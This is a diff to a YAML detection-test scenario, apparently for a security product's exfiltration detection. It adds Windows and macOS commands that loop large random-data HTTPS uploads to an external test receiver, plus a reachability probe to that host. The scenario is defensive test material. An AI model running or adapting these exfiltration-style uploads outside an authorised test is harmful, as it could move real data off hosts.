@@ -9,10 +9,14 @@ detection_types:
   - BIOC
   - Correlation
 
-uc_ref: UCS-NDR-05
-tc_ref: TC-NDR-05
-uc_name: "Anomalous Outbound Bytes Detection"
-tc_name: "Multi-Gigabyte HTTPS Upload Exceeding Host Baseline"
+uc_ref: UCS-NDR-02
+tc_ref: TC-NDR-04
+tc_refs:
+  - TC-NDR-04
+  - TC-DLP-01
+pov_scenario_id: POV-SC-008
+uc_name: "Network Detection & Response"
+tc_name: "Demonstrate behavioral analytics thresholds for malicious egress and data exfil detection"
 
 mitre_tactic: "TA0010"
 mitre_tactic_name: "Exfiltration"
@@ -33,6 +37,15 @@ execution_identity:
 
 push_supported: true
 pull_supported: true
+
+# ── Causality Group Owner anchor ────────────────────────────────────────────
+# The bulk exfil is streamed from a containerized egress host: the CGO root is
+# the container entrypoint (containerd-shim) that owns the shell running the
+# receiver reachability check and the chunked-upload beacon — NOT the synthetic
+# cortexsim-agent node. Gives XDR a real originating owner for the exfil session.
+cgo_anchor:
+  image_name: "containerd-shim"
+  primary_username: "root"
 
 infra_modules_needed:
   - base
@@ -71,6 +84,10 @@ steps:
       curl -sSL -o /dev/null -w '%{http_code}' https://exfil-receiver.testmynids.org/upload || true
     identity: container-runtime
     mitre_technique: "T1567"
+    # Root of the causality spine — links from the CGO (containerd-shim).
+    platforms: ["linux", "container", "windows"]
+    platform_variants:
+      windows: "Invoke-WebRequest -Uri https://exfil-receiver.testmynids.org/upload -Method Head -UseBasicParsing"
     expected_detections:
       - plane: NDR
         type: XQL
@@ -104,6 +121,18 @@ steps:
       python3 -m scripts.eal_simulator.cli run /tmp/bulk-exfil.yml --live
     identity: container-runtime
     mitre_technique: "T1041"
+    # Same containerized host / session as the receiver reachability check (no
+    # fork between the curl probe and the python exfil beacon) → shared_entity.
+    causality:
+      parent_step: step-01
+      pivot: shared_entity
+    platforms: ["linux", "container", "windows", "macos"]
+    platform_variants:
+      # Windows chunked HTTPS upload — same volumetric, upload-skewed, long-lived
+      # egress shape to the authorised receiver.
+      windows: '1..4 | ForEach-Object { Invoke-WebRequest -Uri https://exfil-receiver.testmynids.org/upload -Method POST -Body ([byte[]]::new(268435456)) -UseBasicParsing }'
+      # macOS/zsh chunked upload with curl streaming 256 MiB random chunks x4.
+      macos: 'for i in $(seq 1 4); do dd if=/dev/urandom bs=1m count=256 2>/dev/null | curl -s -X POST --data-binary @- https://exfil-receiver.testmynids.org/upload; done'
     expected_detections:
       - plane: NDR
         type: BIOC
